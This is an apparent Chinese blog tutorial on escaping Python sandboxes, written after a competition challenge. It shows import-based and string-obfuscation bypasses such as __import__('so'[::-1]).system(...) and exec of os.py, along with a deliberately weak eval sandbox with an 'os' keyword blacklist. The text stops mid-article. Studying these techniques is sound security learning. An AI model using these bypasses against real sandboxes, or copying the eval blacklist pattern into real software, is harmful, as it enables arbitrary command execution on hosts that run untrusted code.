<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    <meta name="description" content="Hexo Theme Redefine">
    <meta name="author" content="GTL-JU">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2023/07/20/python沙箱逃逸/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="python沙箱逃逸在国赛线下赛遇到了python沙箱逃逸的题目，之前在python这块接触的不是很多，这篇文章算是对python沙箱逃逸进行了学习，对着网上师傅的文章进行了复现和学习。文章链接放在文章末了。 一、关于沙箱逃逸我们先了解一下什么是沙箱？ 沙箱是一种安全机制，用于隔离和限制应用程序或代码的行为。它创建了一个受限的环境，以防止恶意代码对系统造成损害。沙箱通常用于执行不受信任的代码，如浏">
<meta property="og:type" content="article">
<meta property="og:title" content="python沙箱逃逸">
<meta property="og:url" content="http://example.com/2023/07/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="python沙箱逃逸在国赛线下赛遇到了python沙箱逃逸的题目，之前在python这块接触的不是很多，这篇文章算是对python沙箱逃逸进行了学习，对着网上师傅的文章进行了复现和学习。文章链接放在文章末了。 一、关于沙箱逃逸我们先了解一下什么是沙箱？ 沙箱是一种安全机制，用于隔离和限制应用程序或代码的行为。它创建了一个受限的环境，以防止恶意代码对系统造成损害。沙箱通常用于执行不受信任的代码，如浏">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720094745117.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720100115779.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720100721603.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720103821930.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720104027703.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720104348087.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720114616897.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720194250429.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720122459683.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720122635251.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720124505474.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720151933663.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720153018926.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720155649453.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720155737200.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720160914809.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720161651311.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720172906065.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720173705814.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720174914294.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720180216542.png">
<meta property="article:published_time" content="2023-07-20T12:08:52.000Z">
<meta property="article:modified_time" content="2023-07-20T12:17:28.880Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720094745117.png">
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            python沙箱逃逸 -
        
        JU blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/assets/fonts.css">

    <!--- Font Part-->
    
    
    
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    let Global = window.Global || {};
    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["php","java","比赛wp","环境搭建"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"JU's blog","subtitle":{"text":[],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"audios":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.evanluo.top/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/GTL-JU","Blog":"https://www.cnblogs.com/GTL-JU/","Friends":"/friends"}},"友链":{"icon":"fa-regular fa-link","path":"/links/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="main-content-container">

        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                JU blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        首页
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        归档
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
                                    
                                        
                                            <i class="fa-regular fa-chart-bar"></i>
                                        
                                        状态
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a href="/friends">友情链接
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/links/"  >
                                    
                                        
                                            <i class="fa-regular fa-link"></i>
                                        
                                        友链
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer">
        <ul class="drawer-navbar-list">
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                首页
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                归档
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
                             
                                
                                    <i class="fa-regular fa-chart-bar"></i>
                                
                                状态
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" href="/about">ME</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" href="/friends">友情链接</a>
                            </li>
                        
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/links/"  >
                             
                                
                                    <i class="fa-regular fa-link"></i>
                                
                                友链
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            
            
                <div class="article-title">
                    <h1 class="article-title-regular">python沙箱逃逸</h1>
                </div>
            
                
            

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/logo.png">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">GTL-JU</span>
                            
                                <span class="author-label">Lv2</span>
                            
                        </div>
                        <div class="meta-info">
                            <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-07-20 20:08:52</span>
        <span class="mobile">2023-07-20 20:08</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-07-20 20:17:28</span>
            <span class="mobile">2023-07-20 20:17</span>
            <span class="hover-info">更新</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/python/">python</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>8.5k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>39 分钟</span>
        </span>
    
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content markdown-body">
                <h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><p>在国赛线下赛遇到了python沙箱逃逸的题目，之前在python这块接触的不是很多，这篇文章算是对python沙箱逃逸进行了学习，对着网上师傅的文章进行了复现和学习。文章链接放在文章末了。</p>
<h1 id="一、关于沙箱逃逸"><a href="#一、关于沙箱逃逸" class="headerlink" title="一、关于沙箱逃逸"></a>一、关于沙箱逃逸</h1><p>我们先了解一下什么是沙箱？</p>
<p>沙箱是一种安全机制，用于隔离和限制应用程序或代码的行为。它创建了一个受限的环境，以防止恶意代码对系统造成损害。沙箱通常用于执行不受信任的代码，如浏览器中的JavaScript或其他不受信任的应用程序。它们限制了代码的权限和访问能力，以确保其不能对底层系统或其他应用程序造成危害。</p>
<p>所以说沙箱逃逸就是要突破沙箱，绕过各种过滤和限制，最终可以执行系统任意命令，写文件或者读取文件。</p>
<h1 id="二、如何沙箱逃逸"><a href="#二、如何沙箱逃逸" class="headerlink" title="二、如何沙箱逃逸"></a>二、如何沙箱逃逸</h1><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>我们先了解一下python导入模块的机制：</p>
<p>导入模块时，Python首先检查<code>sys.modules</code>字典，以确定是否已经加载了该模块。<code>sys.modules</code>是一个全局字典，它用于缓存已导入的模块，其中键是模块名，值是对应的模块对象。如果模块已经在<code>sys.modules</code>中，Python会直接使用缓存的模块对象，而不会重新加载该模块</p>
<p>如果模块没有在<code>sys.modules</code>中，则Python会按照一定的顺序在<code>sys.path</code>列表中的目录中查找模块文件。<code>sys.path</code>是一个包含目录路径的列表，用于指定Python解释器在哪些位置查找模块文件。默认情况下，<code>sys.path</code>包括当前目录、Python安装路径、Python标准库路径、以及其他用户定义的路径</p>
<p>找到模块文件后，Python会加载它并执行其中的代码。在执行模块文件时，模块的全局命名空间会被创建，并在其中定义函数、类、变量等。执行完成后，Python会将模块对象添加到<code>sys.modules</code>字典中，以便下次导入时直接使用缓存的模块对象</p>
<p>当使用<code>import a</code>时，只有模块<code>a</code>会添加至<code>sys.modules</code>中，并导入到当前命名空间。但是，如果在<code>a.py</code>中存在<code>import b</code>语句，那么在导入模块<code>a</code>时，Python会先检查<code>b</code>是否已经在<code>sys.modules</code>中，如果已经存在，则直接使用缓存的模块对象。否则，Python会继续按照上述步骤查找并加载<code>b</code>模块。</p>
<p>当使用<code>from x import y</code>时，只有模块<code>x</code>会添加至<code>sys.modules</code>中，并导入到当前命名空间。这里的<code>y</code>是<code>x</code>模块中定义的函数、类、变量等。而不会将<code>y</code>添加至<code>sys.modules</code>中，只有<code>x</code>模块会添加。</p>
<p>下面是我们一一些导入方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import xxx</span><br><span class="line"></span><br><span class="line">from xxx import *</span><br><span class="line"></span><br><span class="line">__import__(&#x27;xxx&#x27;)</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;xxx&#x27;]=&#x27;blacklist&#x27;</span><br><span class="line">del sys.modules[&#x27;xxx&#x27;]</span><br><span class="line">import xxx</span><br><span class="line"></span><br><span class="line">a = open(&#x27;/usr/lib/python3.8/xxx.py&#x27;).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">execfile(&#x27;/usr/lib/python2.7/xxx.py&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>在python命令执行中我们最经常导入的就是os模块</p>
<p>os模块中提供了许多用于处理文件系统，路劲，进程管理登操作的函数</p>
<p>我们经常通过导入os模块进行命令执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;whoami&quot;)</span><br><span class="line"></span><br><span class="line">#laptop-6degb138\</span><br></pre></td></tr></table></figure></div>

<p>我们这里其实就是调用os模块中的system方法调用操作系统的命令行解释器来执行我们给定的命令</p>
<p>那么最简单沙箱就是直接将import os给禁止了</p>
<p>但是这样的也很好绕过，我们可以通过多加空格的方式绕过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import  os</span><br><span class="line">import   os</span><br><span class="line">import    os</span><br></pre></td></tr></table></figure></div>

<p>这就是一个简单的沙箱逃逸例子</p>
<p>当然这种情况可以通过把空格也给ban掉、</p>
<p>但是在python中可以进行导入并不是只有import</p>
<p>我们还可以通过<code>__import__</code>、<code>importlib</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;)</span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">Python中的import语句在代码编写阶段就确定了要导入的模块，而import_module() 允许在代码运行过程中根据需要导入模块。</span><br></pre></td></tr></table></figure></div>

<p>在 Python 中，<code>import</code> 语句的本质就是执行一遍导入的模块（库）。</p>
<p>那么这个过程我们可以通过其他方法来实现</p>
<p><strong>execfile()</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execfile(filename, globals=None, locals=None)</span><br><span class="line">filename：要执行的外部 Python 文件的文件名。</span><br><span class="line">globals：全局命名空间字典，如果不指定，则使用当前的全局命名空间。</span><br><span class="line">locals：局部命名空间字典，如果不指定，则使用 globals 字典作为局部命名空间。</span><br></pre></td></tr></table></figure></div>

<p>这里使用execfile(）函数可以直接在当前 Python 程序中执行指定的 Python 文件。它会读取文件中的代码，并在当前命名空间中执行这些代码。因此，文件中定义的函数、类、变量等将会在执行后在当前程序中可用</p>
<p>那我们不就可以通过它去实现import导入模块的功能</p>
<p>示例：</p>
<p>my_module.py</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># my_module.py</span><br><span class="line"></span><br><span class="line">def say_hello(name):</span><br><span class="line">    print(f&quot;Hello, &#123;name&#125;!&quot;)</span><br></pre></td></tr></table></figure></div>

<p>main.py</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># main.py</span><br><span class="line"></span><br><span class="line">import my_module</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    name = &quot;John&quot;</span><br><span class="line">    my_module.say_hello(name)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720094745117.png"
                      alt="image-20230720094745117"
                ></p>
<p>当然我们也可以通过这种方法导入os模块</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)</span><br><span class="line">system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720100115779.png"
                      alt="image-20230720100115779"
                ></p>
<p>但是这种方法只能在python2中使用python3中删除了这个函数</p>
<p>但是我们可以通过这种方式来实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import builtins</span><br><span class="line"></span><br><span class="line">def execfile(filename):</span><br><span class="line">    with open(filename, &#x27;r&#x27;) as file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    exec(code, globals())</span><br><span class="line"></span><br><span class="line"># 假设有一个名为 example.py 的文件，内容如下：</span><br><span class="line"># print(&quot;Hello, World!&quot;)</span><br><span class="line"></span><br><span class="line">execfile(&quot;example.py&quot;)  # 在当前命名空间中执行 example.py 文件</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>当然我们也可以通过这种方法导入os模块进行命令执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;/usr/lib/python3.11/os.py&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"></span><br><span class="line">system(&#x27;pwd&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720100721603.png"
                      alt="image-20230720100721603"
                ></p>
<p>这种方法实在python2和python3中都适用的</p>
<p>获取库的路径:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 获取os模块所在的文件路径</span><br><span class="line">os_module_path = sys.modules[&#x27;os&#x27;].__file__</span><br><span class="line"></span><br><span class="line">print(&quot;os.py 的路径:&quot;, os_module_path)</span><br></pre></td></tr></table></figure></div>

<p>当然这种情况下，sys杯ban了我们还可以使用<code>importlib</code> 模块</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"># 动态导入 os 模块</span><br><span class="line">os_module = importlib.import_module(&#x27;os&#x27;)</span><br><span class="line"></span><br><span class="line"># 获取 os 模块所在的文件路径</span><br><span class="line">os_module_path = os_module.__file__</span><br><span class="line"></span><br><span class="line">print(&quot;os.py 的路径:&quot;, os_module_path)</span><br></pre></td></tr></table></figure></div>

<h2 id="各种过滤"><a href="#各种过滤" class="headerlink" title="各种过滤"></a>各种过滤</h2><h3 id="过滤字符串"><a href="#过滤字符串" class="headerlink" title="过滤字符串"></a>过滤字符串</h3><p>上面是我们关于导入模块的一些手法，在沙箱环境中，为了避免用户执行命令或者其他操作，通常会把一些命令或者命令执行，文件操作函数这些字符串给禁止掉</p>
<p>例如在一些沙箱中，如果匹配到os，会直接不让运行，那么这种情况我们就可以通过变化字符来使用os</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;so&#x27;[::-1]).system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720103821930.png"
                      alt="image-20230720103821930"
                ></p>
<p>这样来通过一个例子来进行演示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def execute_command(command):</span><br><span class="line">    # 在这里添加限制代码，禁止使用os模块</span><br><span class="line">    if &#x27;os&#x27; in command:</span><br><span class="line">        print(&quot;Sorry, the &#x27;os&#x27; module is not allowed.&quot;)</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            output = eval(command)</span><br><span class="line">            print(&quot;Output:&quot;, output)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&quot;Error:&quot;, e)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(&quot;Welcome to the command execution challenge!&quot;)</span><br><span class="line">    print(&quot;You can enter any Python expression to execute.&quot;)</span><br><span class="line">    print(&quot;Type &#x27;exit&#x27; to quit.&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        user_input = input(&quot;&gt;&gt;&gt; &quot;)</span><br><span class="line">        if user_input.lower() == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        execute_command(user_input)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720104027703.png"
                      alt="image-20230720104027703"
                ></p>
<p>可以看到我们成功突破了沙箱的限制</p>
<p>当然我们也可以使用拼接的方法</p>
